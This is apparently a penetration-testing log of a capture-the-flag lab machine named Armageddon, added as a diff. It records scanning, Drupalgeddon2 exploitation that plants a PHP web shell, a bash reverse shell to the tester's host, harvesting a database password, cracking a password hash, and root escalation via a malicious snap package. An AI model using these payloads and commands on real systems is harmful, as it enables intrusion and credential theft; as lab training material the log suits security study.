@@ -1,0 +1,351 @@
+Machine-Name : Armageddon
+IP-Address   : 10.129.48.89
+
+Command-Line: sudo nmap -p- -A -T4 10.129.48.89
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 20:59 EDT
+    Nmap scan report for 10.129.48.89
+    Host is up (0.050s latency).
+    Not shown: 65533 closed ports
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
+    | ssh-hostkey:
+    |   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
+    |   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
+    |_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
+    80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+    |_http-generator: Drupal 7 (http://drupal.org)
+    | http-robots.txt: 36 disallowed entries (15 shown)
+    | /includes/ /misc/ /modules/ /profiles/ /scripts/
+    | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
+    | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
+    |_/LICENSE.txt /MAINTAINERS.txt
+    |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+    |_http-title: Welcome to  Armageddon |  Armageddon
+    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+    TCP/IP fingerprint:
+    OS:SCAN(V=7.91%E=4%D=8/10%OT=22%CT=1%CU=31189%PV=Y%DS=2%DC=T%G=Y%TM=6113211
+    OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=A)SEQ
+    OS:(SP=102%GCD=1%ISR=10B%TI=Z%II=I%TS=A)SEQ(SP=102%GCD=1%ISR=10B%TI=Z%CI=I%
+    OS:TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5
+    OS:=M54DST11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=
+    OS:7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
+    OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
+    OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
+    OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
+    OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
+    OS:%T=40%CD=S)
+
+    Network Distance: 2 hops
+
+    TRACEROUTE (using port 443/tcp)
+    HOP RTT      ADDRESS
+    1   47.14 ms 10.10.14.1
+    2   47.21 ms 10.129.48.89
+
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 39.52 seconds
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -e php,txt -f -t 50 -i 200,301,302,403 -u http://10.129.48.89
+Result:
+    Target: http://10.129.48.89/
+
+    [21:07:37] Starting:
+    [21:07:37] 200 -   10KB - /includes/
+    [21:07:37] 301 -  237B  - /includes  ->  http://10.129.48.89/includes/
+    [21:07:38] 200 -    7KB - /index.php
+    [21:07:38] 200 -   42B  - /xmlrpc.php
+    [21:07:38] 301 -  236B  - /scripts  ->  http://10.129.48.89/scripts/
+    [21:07:38] 200 -    3KB - /scripts/
+    [21:07:38] 301 -  233B  - /misc  ->  http://10.129.48.89/misc/
+    [21:07:38] 200 -   16KB - /misc/
+    [21:07:38] 200 -    3KB - /install.php
+    [21:07:38] 403 -    7KB - /cron.php
+    [21:07:38] 403 -  206B  - /.htm
+    [21:07:38] 200 -   18KB - /LICENSE.txt
+    [21:07:38] 403 -    4KB - /update.php
+    [21:07:38] 301 -  237B  - /profiles  ->  http://10.129.48.89/profiles/
+    [21:07:38] 200 -    1KB - /profiles/
+    [21:07:39] 200 -   18KB - /INSTALL.txt
+    [21:07:39] 200 -   10KB - /UPGRADE.txt
+    [21:07:39] 200 -    9KB - /MAINTAINERS.txt
+    [21:07:39] 200 -  109KB - /CHANGELOG.txt
+    [21:07:39] 301 -  234B  - /sites  ->  http://10.129.48.89/sites/
+    [21:07:39] 200 -    1KB - /sites/
+    [21:07:41] 200 -    9KB - /modules/
+    [21:07:41] 200 -    2KB - /themes/
+    [21:07:41] 301 -  236B  - /modules  ->  http://10.129.48.89/modules/
+    [21:07:42] 403 -  210B  - /cgi-bin/
+    [21:07:42] 301 -  235B  - /themes  ->  http://10.129.48.89/themes/
+    [21:07:42] 403 -  207B  - /.html
+    [21:07:43] 200 -   73KB - /icons/
+    [21:07:44] 200 -    2KB - /robots.txt
+    [21:07:49] 200 -    5KB - /README.txt
+    [21:07:53] 403 -  206B  - /.htc
+    [21:07:55] 200 -    1KB - /COPYRIGHT.txt
+    [21:08:02] 403 -  214B  - /.html_var_DE
+    [21:08:16] 403 -    3KB - /authorize.php
+    [21:08:24] 403 -  208B  - /.html.
+    [21:08:29] 403 -  212B  - /.html.html
+    [21:08:37] 403 -  212B  - /.htpasswds
+    [21:08:55] 403 -  207B  - /.htm.
+    [21:09:00] 403 -  208B  - /.htmll
+    [21:09:06] 403 -  211B  - /.html.old
+    [21:09:14] 403 -  205B  - /.ht
+    [21:09:14] 403 -  211B  - /.html.bak
+    [21:09:23] 403 -  210B  - /.htm.htm
+    [21:09:33] 200 -  174B  - /.gitignore
+    [21:09:47] 403 -  208B  - /.html1
+    [21:10:06] 403 -  217B  - /.html.printable
+    [21:10:06] 403 -  211B  - /.html.LCK
+    [21:10:30] 403 -  210B  - /.htm.LCK
+    [21:11:08] 403 -  211B  - /.html.php
+    [21:11:08] 403 -  206B  - /.htx
+    [21:11:08] 403 -  208B  - /.htmls
+    [21:12:06] 403 -  207B  - /.htlm
+    [21:12:06] 403 -  207B  - /.htm2
+    [21:12:06] 403 -  209B  - /.htuser
+    [21:12:06] 403 -  208B  - /.html-
+    [21:13:57] 403 -  211B  - /.htm.html
+    [21:13:57] 403 -  210B  - /.htacess
+    [21:13:57] 403 -  208B  - /.htm.d
+    [21:13:57] 403 -  210B  - /.htm.old
+    [21:13:57] 403 -  209B  - /.html-1
+    [21:13:57] 403 -  212B  - /.html.orig
+    [21:13:57] 403 -  206B  - /.hts
+    [21:13:57] 403 -  213B  - /.html_files
+    [21:13:57] 403 -  211B  - /.html.sav
+    [21:13:57] 403 -  208B  - /.html_
+    [21:13:57] 403 -  210B  - /.htmlpar
+    [21:13:57] 403 -  212B  - /.htmlprint
+
+    Task Completed
+
+Browser: drupal 7 exploits
+URL: https://github.com/dreadlocked/Drupalgeddon2
+
+Command-Line: export PATH=/home/kali/.rvm/rubies/ruby-3.0.0/bin/gem:$PATH
+
+Command-Line: ./drupalgeddon2.rb http://10.129.48.89/
+Result:
+    [*] --==[::#Drupalggedon2::]==--
+    --------------------------------------------------------------------------------
+    [i] Target : http://10.129.48.89/
+    --------------------------------------------------------------------------------
+    [-] The target timed out ~ execution expired
+
+TRY HARDER!!!
+
+kali@kali:~/HackingTools/Drupalgeddon2$ ./drupalgeddon2.rb http://10.129.48.89/
+Result:
+    [*] --==[::#Drupalggedon2::]==--
+    --------------------------------------------------------------------------------
+    [i] Target : http://10.129.48.89/
+    --------------------------------------------------------------------------------
+    [+] Found  : http://10.129.48.89/CHANGELOG.txt    (HTTP Response: 200)
+    [+] Drupal!: v7.56
+    --------------------------------------------------------------------------------
+    [*] Testing: Form   (user/password)
+    [+] Result : Form valid
+    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+    [*] Testing: Clean URLs
+    [!] Result : Clean URLs disabled (HTTP Response: 404)
+    [i] Isn't an issue for Drupal v7.x
+    --------------------------------------------------------------------------------
+    [*] Testing: Code Execution   (Method: name)
+    [i] Payload: echo YEGOZUXY
+    [+] Result : YEGOZUXY
+    [+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
+    --------------------------------------------------------------------------------
+    [*] Testing: Existing file   (http://10.129.48.89/shell.php)
+    [i] Response: HTTP 404 // Size: 5
+    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+    [*] Testing: Writing To Web Root   (./)
+    [i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
+    [+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
+    [+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
+    --------------------------------------------------------------------------------
+    [i] Fake PHP shell:   curl 'http://10.129.48.89/shell.php' -d 'c=hostname'
+    armageddon.htb>>
+
+Notes: Gained reverse-shell.
+Result:
+    *** REVERSE SHELL ***
+    armageddon.htb>>
+
+Command-Line: nc -lvnp 443
+Notes: Opened BurpSuit and turned on interceptor. Sent http://10.129.48.89/shell.php?c=/usr/bin/bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.139/443+0>%261' to repeater.
+Result:
+    bash-4.2$
+
+bash-4.2$cat /etc/passwd
+Result:
+    root:x:0:0:root:/root:/bin/bash
+    bin:x:1:1:bin:/bin:/sbin/nologin
+    daemon:x:2:2:daemon:/sbin:/sbin/nologin
+    adm:x:3:4:adm:/var/adm:/sbin/nologin
+    lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+    sync:x:5:0:sync:/sbin:/bin/sync
+    shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+    halt:x:7:0:halt:/sbin:/sbin/halt
+    mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+    operator:x:11:0:operator:/root:/sbin/nologin
+    games:x:12:100:games:/usr/games:/sbin/nologin
+    ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+    nobody:x:99:99:Nobody:/:/sbin/nologin
+    systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+    dbus:x:81:81:System message bus:/:/sbin/nologin
+    polkitd:x:999:998:User for polkitd:/:/sbin/nologin
+    sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+    postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+    apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+    mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
+    brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
+
+Notes: "root" and "brucetherealadmin" usernames.
+
+bash-4.2$ cd /var/www/html/sites/default
+bash-4.2$ cat settings.php
+Result:
+    $databases = array (
+      'default' =>
+      array (
+        'default' =>
+        array (
+          'database' => 'drupal',
+          'username' => 'drupaluser',
+          'password' => 'CQHEy@9M*m23gBVj',
+          'host' => 'localhost',
+          'port' => '',
+          'driver' => 'mysql',
+          'prefix' => '',
+        ),
+      ),
+    );
+
+Notes: Found username "drupaluser" and password "CQHEy@9M*m23gBVj" for mysql database. Database name is "drupal"
+
+bash-4.2$ mysql -u drupaluser --password=CQHEy@9M*m23gBVj -D drupal -e 'show tables'
+bash-4.2$ mysql -u drupaluser --password=CQHEy@9M*m23gBVj -D drupal -e 'describe users'
+bash-4.2$ mysql -u drupaluser --password=CQHEy@9M*m23gBVj -D drupal -e 'select uid,name,pass from users;'
+Result:
+    uid     name    pass
+    0
+    1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
+
+
+Command-Line: hashcat --help | grep -i Drupal
+Result:
+    7900 | Drupal7                                          | Forums, CMS, E-Commerce
+
+Command-Line: hashcat -m 7900 '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt' /usr/share/wordlists/rockyou.txt
+    hashcat (v6.1.1) starting...
+
+    OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+    =============================================================================================================================
+    * Device #1: pthread-Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz, 13897/13961 MB (4096 MB allocatable), 2MCU
+
+    Minimum password length supported by kernel: 0
+    Maximum password length supported by kernel: 256
+
+    Hashes: 1 digests; 1 unique digests, 1 unique salts
+    Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+    Rules: 1
+
+    Applicable optimizers applied:
+    * Zero-Byte
+    * Single-Hash
+    * Single-Salt
+    * Uses-64-Bit
+    * (null)
+
+    Watchdog: Hardware monitoring interface not found on your system.
+    Watchdog: Temperature abort trigger disabled.
+
+    Host memory required for this attack: 64 MB
+
+    Dictionary cache built:
+    * Filename..: /usr/share/wordlists/rockyou.txt
+    * Passwords.: 14344392
+    * Bytes.....: 139921507
+    * Keyspace..: 14344385
+    * Runtime...: 1 sec
+
+    $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo
+
+    Session..........: hashcat
+    Status...........: Cracked
+    Hash.Name........: Drupal7
+    Hash.Target......: $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
+    Time.Started.....: Fri Aug 13 10:43:28 2021 (2 secs)
+    Time.Estimated...: Fri Aug 13 10:43:30 2021 (0 secs)
+    Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+    Guess.Queue......: 1/1 (100.00%)
+    Speed.#1.........:      142 H/s (9.88ms) @ Accel:32 Loops:1024 Thr:1 Vec:4
+    Recovered........: 1/1 (100.00%) Digests
+    Progress.........: 256/14344385 (0.00%)
+    Rejected.........: 0/256 (0.00%)
+    Restore.Point....: 192/14344385 (0.00%)
+    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:31744-32768
+    Candidates.#1....: alyssa -> freedom
+
+    Started: Fri Aug 13 10:42:49 2021
+    Stopped: Fri Aug 13 10:43:32 2021
+
+Notes: Cracked password is "booboo".
+
+Command-Line: ssh brucetherealadmin@10.129.48.89
+Password: booboo
+Result:
+    *** USER ACCESS ***
+
+
+[brucetherealadmin@armageddon ~]$ cat user.txt
+Result:
+    fa588af3d08c17a1d10689fde8ae2d0e
+    *** USER OWNED ***
+
+[brucetherealadmin@armageddon ~]$sudo -l
+Result:
+    User brucetherealadmin may run the following commands on armageddon:
+        (root) NOPASSWD: /usr/bin/snap install *
+
+Notes: "brucetherealadmin" can install anything as root using snap.
+
+Browser: GTFObins -> Snap -> Sudo.
+Result:
+    ./snap-payload
+URL: https://gtfobins.github.io/gtfobins/snap/
+
+Notes: "fpm" required.
+URL: https://fpm.readthedocs.io/en/latest/installing.html
+Command-Line: sudo gem install --no-document fpm
+
+Command-Line: ls
+Result:
+    xxxx_1.0_all.snap
+
+Command-Line: sudo python3 -m http.server --bind 10.10.14.139 80
+Command-Line: nc -lvnp 9002
+
+[brucetherealadmin@armageddon tmp]$ curl 10.10.14.139/xxxx_1.0_all.snap -o default.snap
+Result:
+      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                     Dload  Upload   Total   Spent    Left  Speed
+    100  4096  100  4096    0     0  38950      0 --:--:-- --:--:-- --:--:-- 39009
+
+
+[brucetherealadmin@armageddon tmp]$ sudo snap install default.snap --dangerous --devmode
+Result:
+    connect to [10.10.14.139] from (UNKNOWN) [10.129.48.89] 49388
+    bash: cannot set terminal process group (1431): Inappropriate ioctl for device
+    bash: no job control in this shell
+    bash-4.3#
+    *** ROOT ACCESS ***
+
+bash-4.3# cat /root/root.txt
+Result:
+    85a31bc54883bb271248644992dfdb13
+    *** ROOT OWNED ***
+
+      *** FINISHED ***
